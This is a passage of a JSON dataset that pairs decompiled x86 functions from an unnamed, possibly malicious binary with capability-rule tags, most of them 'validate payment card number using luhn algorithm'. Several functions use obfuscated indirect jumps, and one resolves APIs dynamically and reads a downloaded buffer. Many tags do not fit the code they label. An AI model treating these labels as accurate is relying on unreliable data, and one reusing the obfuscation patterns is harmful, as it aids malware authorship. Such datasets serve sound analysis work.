        "decompiled_code": "\nuint * __cdecl fcn.0043f450(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = fcn.0044db80(0x20);\n    if (puVar1 == NULL) {\n        puVar1 = NULL;\n    }\n    else {\n        *puVar1 = arg_10h;\n        puVar1[1] = arg_14h;\n        puVar1[2] = arg_ch;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[7] = in_EAX;\n        if ((in_EAX & 0x2000000) != 0) {\n            puVar1[7] = in_EAX | 0xf003f;\n        }\n    }\n    arg_10h = puVar1;\n    fcn.0043ffc0(&arg_10h);\n    return arg_10h;\n}\n",
        "token_count": 244
    },
    "0043ffc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ffc0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 314
    },
    "004418a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004418a0(void)\n\n{\n    int32_t extraout_EDX;\n    int32_t unaff_EDI;\n    \n    fcn.0053c532(0x71ee89e4);\n    // WARNING: Could not recover jumptable at 0x005cdd59. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*(unaff_EDI + (((extraout_EDX + -1) * 2 | extraout_EDX + -1 < 0) ^ 0x11d15ee6)))();\n    return;\n}\n",
        "token_count": 128
    },
    "00441d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x006a59bb)\n\nvoid fcn.00441d90(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t unaff_ESI;\n    uint *puVar5;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    uStack4 = 0x71e979d9;\n    fcn.0053c532();\n    piVar1 = unaff_EDI - 4;\n    *piVar1 = unaff_EDI;\n    if (piVar1 <= &stack0x0000005c) {\n        uVar3 = unaff_EDI - 0x84U & 0xfffffffc;\n        puVar4 = uVar3 - 0x40;\n        *(uVar3 - 0x44) = piVar1;\n        *(uVar3 - 0x48) = unaff_ESI + 4;\n        *(uVar3 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar3, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar4 < 0) * 0x80 | (puVar4 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar4 & 0xff) & 1U) == 0) * 4 | uVar3 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar5 = &uStack4;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 588
    },
    "00442e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442e70(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 314
    },
    "00442ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442ef0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 314
    },
    "00442f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442f70(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EDX;\n    \n    fcn.0044e18c(in_EDX, 0x200, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 60
    },
    "00442f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442f90(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EDX;\n    \n    fcn.0044e18c(in_EDX, 100, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "00445110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Removing unreachable block (ram,0x004453f8)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00445110(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uVar5;\n    char *noname_1;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t unaff_ESI;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *in_FS_OFFSET;\n    uint var_14e4h;\n    uint var_4e4h;\n    uint var_2e4h;\n    uint var_1e4h;\n    uint var_e0h;\n    int32_t iStackY224;\n    int32_t iStackY220;\n    int32_t iStackY216;\n    uint *puStackY212;\n    int32_t iStackY208;\n    uint uStackY204;\n    uint uStackY200;\n    int32_t iStackY196;\n    uint uStackY192;\n    uint *puStackY188;\n    code *pcStackY184;\n    code *pcStackY180;\n    uint uStackY176;\n    uint *puStackY172;\n    uint var_a4h;\n    uint uStackY164;\n    uint uStackY160;\n    uint32_t var_98h;\n    uint *var_94h;\n    uint *var_90h;\n    uint var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    uint *var_80h;\n    uint var_7ch;\n    uint *var_78h;\n    uint *var_74h;\n    uint var_68h;\n    uint32_t var_64h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    code *var_38h;\n    code *var_34h;\n    code *var_30h;\n    code *var_2ch;\n    code *var_28h;\n    code *var_24h;\n    code *var_20h;\n    int32_t var_1ch;\n    code *var_18h;\n    uchar auStack24 [3];\n    uint var_11h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_ch = *in_FS_OFFSET;\n    var_4h = 0xffffffff;\n    uStack12 = 0x459548;\n    *in_FS_OFFSET = &fcn.00445110::var_ch;\n    stack0xffffffec = 0x445132;\n    fcn.00458160();\n    var_1ch = *(arg_8h + 0x804);\n    _auStack24 = unaff_ESI;\n    if (var_1ch != 0) {\n        var_20h = 0x445148;\n        fcn.0044d924();\n        *(arg_8h + 0x804) = 0;\n    }\n    pcVar6 = *0x4c8f0b;\n    var_1ch = 0x45c1d8;\n    var_20h = 0x445162;\n    var_20h = (**0x4c8f0b)();\n    var_28h = 0x445169;\n    iVar2 = func_0x0061cbcc();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 0;\n    }\n    var_28h = 0x45c1e4;\n    var_2ch = 0x44518b;\n    var_2ch = (*pcVar6)();\n    var_34h = 0x445192;\n    var_30h = iVar2;\n    pcVar3 = fcn.0043d840();\n    var_2ch = 0x45c1f0;\n    var_30h = 0x44519e;\n    var_30h = (*pcVar6)();\n    var_38h = 0x4451a5;\n    var_34h = iVar2;\n    var_2ch = fcn.0043d840();\n    var_30h = 0x45c200;\n    var_34h = 0x4451b2;\n    var_34h = (*pcVar6)();\n    var_3ch = 0x4451b9;\n    var_38h = iVar2;\n    var_18h = fcn.0043d840();\n    var_34h = 0x45c214;\n    var_38h = 0x4451c6;\n    var_38h = (*pcVar6)();\n    var_40h = 0x4451cd;\n    var_3ch = iVar2;\n    var_38h = fcn.0043d840();\n    var_3ch = 0x4451da;\n    var_3ch = (*pcVar6)();\n    var_44h = 0x4451e1;\n    var_40h = iVar2;\n    var_20h = fcn.0043d840();\n    var_3ch = 0x45c234;\n    var_40h = 0x4451ee;\n    var_40h = (*pcVar6)();\n    var_48h = 0x4451f5;\n    var_44h = iVar2;\n    var_1ch = fcn.0043d840();\n    var_40h = 0x45c24c;\n    var_44h = 0x445202;\n    var_44h = (*pcVar6)();\n    var_4ch = 0x445209;\n    var_48h = iVar2;\n    var_24h = fcn.0043d840();\n    var_44h = 0x45c260;\n    var_48h = 0x445216;\n    var_48h = (*pcVar6)();\n    var_4ch = iVar2;\n    var_28h = fcn.0043d840();\n    var_48h = 0x45c274;\n    var_4ch = 0x44522a;\n    var_4ch = (*pcVar6)();\n    var_30h = fcn.0043d840();\n    var_4ch = 0x45c28c;\n    (*pcVar6)();\n    var_34h = fcn.0043d840();\n    (*pcVar6)();\n    pcVar4 = fcn.0043d840();\n    _auStack24 = _auStack24 & 0xffffff;\n    if ((((((pcVar3 == NULL) || (var_2ch == NULL)) || (var_18h == NULL)) || ((var_38h == NULL || (var_20h == NULL)))) ||\n        ((var_1ch == 0 || ((var_24h == NULL || (var_28h == NULL)))))) || ((var_30h == NULL || (var_34h == NULL))))\n    goto code_r0x00445553;\n    var_48h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    if (pcVar4 != NULL) {\n        (*pcVar4)();\n    }\n    if ((var_48h == 0) && (var_40h != 0)) {\n        uVar5 = 3;\n    }\n    else {\n        uVar5 = 0;\n    }\n    var_64h = 0x45c2c8;\n    var_68h = 0x445302;\n    iVar2 = var_40h;\n    iVar7 = var_3ch;\n    var_68h = fcn.0073082d(0x45c2c8);\n    var_1ch = (*pcVar3)();\n    if (var_1ch != 0) {\n        var_74h = &fcn.00445110::var_e0h;\n        var_78h = 0x445321;\n        fcn.00452080();\n        puVar9 = &fcn.00445110::var_e0h;\n        puVar11 = &fcn.00445110::var_a4h;\n        for (iVar8 = 0xf; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar11 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        var_88h = &fcn.00445110::var_1e4h;\n        var_94h = &fcn.00445110::var_4e4h;\n        var_84h = 0x80;\n        var_7ch = 0x80;\n        var_80h = &fcn.00445110::var_2e4h;\n        var_a4h = 0x3c;\n        var_90h = 0x100;\n        pcVar1 = arg_8h + 4;\n        do {\n            noname_1 = pcVar1;\n            pcVar1 = noname_1 + 1;\n        } while (*noname_1 != '\\0');\n        var_64h = var_64h & 0xffff0000;\n        var_74h = &fcn.00445110::var_68h;\n        var_78h = 0x4453c6;\n        fcn.00445da0(var_74h, noname_1, arg_8h, var_68h, var_64h, uVar5, iVar2, iVar7, 0);\n        var_4h = 0;\n        var_84h = &fcn.00445110::var_64h;\n        var_78h = &fcn.00445110::var_a4h;\n        var_7ch = 0;\n        var_80h = NULL;\n        var_88h = 0x4453ec;\n        (*var_38h)();\n        var_4h = 0xffffffff;\n        var_88h = NULL;\n        var_90h = var_94h;\n        var_94h = var_1ch;\n        var_98h = 0x44541b;\n        pcVar6 = (*var_20h)();\n        var_20h = pcVar6;\n        if (pcVar6 != NULL) {\n            var_98h = (var_98h != 2) - 1 & 0x800000 | 0x100;\n            uStackY160 = 0;\n            uStackY164 = 0;\n            var_a4h = 0;\n            puStackY172 = var_78h;\n            uStackY176 = 0x45c330;\n            pcStackY184 = 0x445455;\n            pcStackY180 = pcVar6;\n            iVar2 = (*var_24h)();\n            if (iVar2 != 0) {\n                if (var_98h == 2) {\n                    pcStackY184 = 0x4;\n                    puStackY188 = &fcn.00445110::var_24h;\n                    uStackY192 = 0x1f;\n                    var_24h = 0x3100;\n                    uStackY200 = 0x44547b;\n                    iStackY196 = iVar2;\n                    (*var_34h)();\n                }\n                pcStackY184 = NULL;\n                puStackY188 = NULL;\n                uStackY192 = 0;\n                iStackY196 = 0;\n                uStackY200 = 0;\n                uStackY204 = 0;\n                puStackY212 = 0x44548b;\n                iStackY208 = iVar2;\n                iVar7 = (*var_28h)();\n                if (iVar7 != 0) {\n                    puStackY212 = NULL;\n                    iStackY220 = 0x445495;\n                    iStackY216 = iVar2;\n                    iVar7 = (*var_30h)();\n                    if (iVar7 != 0) {\n                        puStackY212 = 0x1fa0;\n                        iStackY216 = 0x4454ac;\n                        uVar5 = fcn.0044d234();\n                        *(arg_8h + 0x804) = uVar5;\n                        uVar10 = 0;\n                        do {\n                            puStackY212 = &fcn.00445110::var_4ch;\n                            iStackY216 = 0x1fa0 - uVar10;\n                            iStackY220 = *(arg_8h + 0x804) + uVar10;\n                            var_e0h = 0x4454dc;\n                            iStackY224 = iVar2;\n                            iVar7 = (*var_2ch)();\n                            if ((iVar7 != 1) || (var_4ch == 0)) {\n                                if (uVar10 < 0x1fa0) {\n                                    *(uVar10 + *(arg_8h + 0x804)) = 0;\n                                }\n                                break;\n                            }\n                            uVar10 = uVar10 + var_4ch;\n                        } while (uVar10 < 0x1fa0);\n                        if (uVar10 == 0) {\ncode_r0x00445519:\n                            _auStack24 = _auStack24 & 0xffffff;\n                        }\n                        else {\n                            _auStack24 = CONCAT13(1, auStack24);\n                            if (0x1f9f < uVar10) goto code_r0x00445519;\n                        }\n                        iStackY216 = 0x445521;\n                        puStackY212 = iVar2;\n                        (*var_18h)();\n                        pcVar6 = var_20h;\n                        goto code_r0x00445524;\n                    }\n                }\n                iStackY216 = 0x44549d;\n                puStackY212 = iVar2;\n                (*var_18h)();\n            }\ncode_r0x00445524:\n            puStackY188 = 0x445528;\n            pcStackY184 = pcVar6;\n            (*var_18h)();\n        }\n        var_98h = var_1ch;\n        uStackY160 = 0x44552f;\n        (*var_18h)();\n    }\n    iVar2 = func_0x006d836c();\n    if (iVar2 != 0) {\n        (*pcVar6)();\n    }\n    if (var_40h != 0) {\n        (*pcVar6)();\n    }\n    if (var_3ch != 0) {\n        (*pcVar6)();\n    }\ncode_r0x00445553:\n    uVar5 = func_0x0059e249();\n    return uVar5;\n}\n",
        "token_count": 3402
    },
    "00445650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00445650(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t unaff_EDI;\n    uint var_804h;\n    int32_t var_4h;\n    \n    fcn.0044e5fc(&var_804h, 0x800, unaff_EDI + 4);\n    puVar2 = &var_804h;\n    var_4h = 0x800;\n    do {\n        cVar1 = *puVar2;\n        puVar2 = puVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00441b60(&var_804h, puVar2 - (&var_804h + 1), unaff_EDI + 4, &var_4h);\n    *(var_4h + 4 + unaff_EDI) = 0;\n    return;\n}\n",
        "token_count": 200
    },
    "00445da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00445da0(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t arg_8h_00;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    int32_t var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x459530;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = *(noname_0 + 0x14);\n    arg_8h_00 = var_10h - in_ECX;\n    if ((uVar1 <= arg_8h_00) && (*(noname_0 + 0x18) != arg_8h_00)) {\n        cVar2 = fcn.00445ef0(arg_8h_00, 1);\n        if (cVar2 != '\\0') {\n            *(noname_0 + 0x14) = uVar1;\n            if (*(noname_0 + 0x18) < 8) {\n                noname_0 = noname_0 + 4;\n            }\n            else {\n                noname_0 = *(noname_0 + 4);\n            }\n            *(noname_0 + uVar1 * 2) = 0;\n        }\n    }\n    var_4h = 0;\n    for (; in_ECX != var_10h; in_ECX = in_ECX + 1) {\n        fcn.00445e60();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 427
    },
    "0044a8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a8c0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 316
    },
    "0044cb74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044cb74(uint32_t param_1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t unaff_DI;\n    char in_OF;\n    \n    uVar4 = ~param_1 + 0x9847dd6f;\n    uVar2 = CONCAT11(in_OF >> 0xe, 0xae);\n    if (0x67b82290 < ~param_1) {\n        uVar2 = unaff_DI | 0x4000;\n    }\n    uVar4 = ~(~(uVar4 * 8 | uVar4 >> 0x1d) + 1);\n    iVar1 = 0;\n    if (uVar2 != 0) {\n        for (; (uVar2 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    uVar4 = (*(uVar4 - 4) ^ uVar4) + 0xa0bab670;\n    uVar3 = (((uVar4 >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 | uVar4 * 0x1000000) << 3 |\n             uVar4 * 0x1000000 >> 0x1d) ^ 0x14445374) + 0xbbaeae6f;\n    uVar4 = uVar3 >> 1;\n    // WARNING: Could not recover jumptable at 0x006b46d8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*(((uVar4 & 0xff000000 | ((uVar3 & 1) != 0) << 0x1f) >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 |\n       uVar4 << 0x18) + 0xa638a951))();\n    return;\n}\n",
        "token_count": 469
    },
    "0044cfd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044cfd0(int32_t *arg_8h)\n\n{\n    int32_t **ppiVar1;\n    int64_t iVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t **unaff_EBX;\n    uint *in_FS_OFFSET;\n    int32_t *var_18h;\n    int32_t **var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_ch = *in_FS_OFFSET;\n    var_4h = 0xffffffff;\n    uStack12 = 0x45931b;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = unaff_EBX[1];\n    if (unaff_EBX[2] == var_10h) {\n        if (var_10h == NULL) {\n            var_10h = 0x1;\n        }\n        else {\n            var_10h = var_10h * 2;\n        }\n        uVar6 = -(ZEXT48(var_10h) * 8 >> 0x20 != 0) | ZEXT48(var_10h) * 8;\n        ppiVar3 = fcn.0044d234(-(0xfffffffb < uVar6) | uVar6 + 4);\n        var_4h = 0;\n        if (ppiVar3 == NULL) {\n            var_14h = NULL;\n        }\n        else {\n            var_14h = ppiVar3 + 1;\n            *ppiVar3 = var_10h;\n            fcn.0044ecf2(var_14h, 8, var_10h, 0x43b000);\n        }\n        var_4h = 0xffffffff;\n        var_18h = NULL;\n        ppiVar3 = var_14h;\n        if (unaff_EBX[2] != NULL) {\n            do {\n                ppiVar1 = *unaff_EBX + var_18h * 2;\n                if (ppiVar1 != ppiVar3) {\n                    fcn.0044d924(*ppiVar3);\n                    piVar4 = ppiVar1[1];\n                    ppiVar3[1] = piVar4;\n                    iVar2 = (piVar4 + 1) * 2;\n                    piVar4 = fcn.0044d234(-(iVar2 >> 0x20 != 0) | iVar2);\n                    *ppiVar3 = piVar4;\n                    fcn.00452100(piVar4, *ppiVar1, ppiVar3[1] * 2);\n                    *(*ppiVar3 + ppiVar3[1] * 2) = 0;\n                }\n                var_18h = var_18h + 1;\n                ppiVar3 = ppiVar3 + 2;\n            } while (var_18h < unaff_EBX[2]);\n        }\n        piVar4 = *unaff_EBX;\n        if (piVar4 != NULL) {\n            fcn.0044ddf9(piVar4, 8, piVar4[-1], 0x43b090);\n            fcn.0044d924(piVar4 + -1);\n        }\n        *unaff_EBX = var_14h;\n        unaff_EBX[1] = var_10h;\n    }\n    piVar4 = *unaff_EBX + unaff_EBX[2] * 2;\n    unaff_EBX[2] = unaff_EBX[2] + 1;\n    if (arg_8h != piVar4) {\n        fcn.0044d924(*piVar4);\n        iVar5 = arg_8h[1];\n        piVar4[1] = iVar5;\n        iVar2 = (iVar5 + 1) * 2;\n        iVar5 = fcn.0044d234(-(iVar2 >> 0x20 != 0) | iVar2);\n        *piVar4 = iVar5;\n        fcn.00452100(iVar5, *arg_8h, piVar4[1] * 2);\n        *(*piVar4 + piVar4[1] * 2) = 0;\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 972
    },
    "0044d180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d180(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 314
    },
    "0044d200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d200(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EDX;\n    \n    fcn.0044e18c(in_EDX, 0x168, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 60
    },
    "0044d25d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d25d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0044f03b(arg_8h, arg_ch, arg_10h, arg_14h);\n    return arg_8h;\n}\n",
        "token_count": 70
    },
    "0044d2f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d2f8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0044d23f(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 67
    },
    "0044d313": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d313(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0044d25d(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 65
    },
    "0044d364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d364(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_4h;\n    \n    fcn.0044d2f8(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 74
    },
    "0044d383": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d383(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_4h;\n    \n    fcn.0044d313(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "0044d8b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0044d8b0(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0044f4e7(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.0044e6e5(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0x45a218;\n    fcn.0044d885(arg_8h_00 + 0xc);\n    fcn.0044f550();\n    return;\n}\n",
        "token_count": 204
    },
    "00452465": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
